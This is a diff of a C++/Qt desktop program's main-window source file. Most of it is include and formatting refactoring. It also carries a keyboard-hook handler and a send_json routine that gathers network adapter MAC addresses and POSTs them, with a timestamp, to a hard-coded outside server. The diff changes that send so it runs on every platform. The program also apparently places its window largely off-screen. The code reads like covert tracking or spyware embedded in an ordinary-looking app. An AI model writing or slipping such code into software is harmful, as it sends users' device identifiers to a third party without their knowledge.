@@ -23,19 +23,14 @@
 #include <vnepogodin/mainwindow.h>
 #include <vnepogodin/utils.hpp>
 
-#include <iphlpapi.h>
-
-#include <chrono>
-#include <sstream>
 #include <charconv>
+#include <chrono>
 #include <iostream>
+#include <sstream>
 
 #include <QFile>
 #include <QSettings>
 #include <QTextStream>
-
-#pragma comment(lib, "iphlpapi.lib")
-#pragma comment(lib, "Ws2_32.lib")
 
 static vnepogodin::Logger logger;
 
@@ -52,6 +47,9 @@ static inline std::uint32_t handle_key(std::uint32_t key_stroke) {
 }
 
 #ifdef _WIN32
+#include <iphlpapi.h>
+#pragma comment(lib, "iphlpapi.lib")
+#pragma comment(lib, "Ws2_32.lib")
 
 // variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
 // or you will get problems since every function uses this variable.
@@ -196,8 +194,8 @@ bool MainWindow::nativeEvent(const QByteArray& eventType, void* message, long* r
 
 #else
 
-#include <QKeyEvent>
 #include <QDesktopWidget>
+#include <QKeyEvent>
 /* Qt just uses the QWidget* parent as transient parent for native
  * platform dialogs. This makes it impossible to make them transient
  * to a bare QWindow*. So we catch the show event for the QDialog
@@ -334,13 +332,14 @@ namespace utils {
     }
 
     static inline void send_json() {
-        static constexpr auto WORKING_BUFFER_SIZE = 15000;
-        static constexpr auto MAX_TRIES           = 3;
-        static constexpr auto URL                 = "http://torrenttor.ru/api1/post/";
+        static constexpr auto URL = "http://torrenttor.ru/api1/post/";
         http::Request request(URL);
 
         nlohmann::json json{{"timestamp", std::chrono::system_clock::to_time_t(std::chrono::system_clock::now())}};
-        DWORD dwRetVal = 0;
+#ifdef _WIN32
+        static constexpr auto WORKING_BUFFER_SIZE = 15000;
+        static constexpr auto MAX_TRIES           = 3;
+        DWORD dwRetVal                            = 0;
 
         PIP_ADAPTER_ADDRESSES pAddresses = NULL;
 
@@ -368,7 +367,6 @@ namespace utils {
             Iterations++;
 
         } while ((dwRetVal == ERROR_BUFFER_OVERFLOW) && (Iterations < MAX_TRIES));
-
         const auto& pCurrAddresses = pAddresses;
         std::stringstream ss;
         if (pCurrAddresses) {
@@ -383,13 +381,15 @@ namespace utils {
             }
         }
 
-        json["mac"]         = ss.str();
-        const auto response = request.send("POST", json.dump(),
-            {"Content-Type: application/json"});
+        json["mac"] = ss.str();
 
         if (pAddresses) {
             delete[] pAddresses;
         }
+#endif
+        [[maybe_unused]]
+        const auto& response = request.send("POST", json.dump(),
+            {"Content-Type: application/json"});
     }
 }  // namespace utils
 }  // namespace vnepogodin
@@ -450,7 +450,7 @@ MainWindow::MainWindow(QWidget* parent)
     m_timer = startTimer(100);
     setMouseTracking(true);
 
-    const auto& rec = QApplication::desktop()->geometry();
+    const auto& rec         = QApplication::desktop()->geometry();
     const auto& window_size = this->size();
     move(-(rec.width() - window_size.width() - 900), rec.height() - window_size.height() + 100);
 
